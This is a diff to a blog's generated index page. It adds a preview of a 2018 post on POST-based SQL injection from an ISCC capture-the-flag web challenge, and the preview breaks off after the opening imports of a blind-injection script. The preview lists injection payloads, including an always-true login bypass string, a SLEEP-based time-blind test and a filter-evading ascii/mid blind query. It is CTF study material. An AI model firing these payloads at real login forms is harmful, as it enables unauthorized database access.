@@ -339,6 +339,40 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2018/08/04/sql_bypass/" >
+            
+                <span>sql_bypass</span>
+        </a>
+        <div class="abstract-content">
+            Post基于iscc一道web题  对post注入进行深入的学习
+判断：admin’ or ‘1’=’1
+如果返回正常，则存在注入
+如果返回错误，则不存在注入
+Post基本上等同于get
+时间盲注判断语句：admin’ AND SLEEP(5) AND ‘SxBt’=’SxBt&amp;password=1
+各种字符均过滤，则使用：uname=’!=!!(asci(mid((passwd)from(1)))=99)!=!!’1&amp;passwd=dddd
+然后盲注脚本post.py
+-*- coding: cp936 -*-
+import urllib2
+import urllib
+...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/04</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2018/08/04/thinkphp代码审计-1/" >
             
                 <span>thinkphp代码审计</span>
@@ -526,9 +560,20 @@ More...
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 3
+        Total : 4
         </div>
         <!-- search  -->
         
@@ -545,6 +590,11 @@ More...
     
         <li class="archive-post-item">
             <span class="archive-post-date">08/04</span><a class="archive-post-title" href= "/2018/08/04/thinkphp代码审计-1/" >thinkphp代码审计</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/04</span><a class="archive-post-title" href= "/2018/08/04/sql_bypass/" >sql_bypass</a>
         </li>
     
     
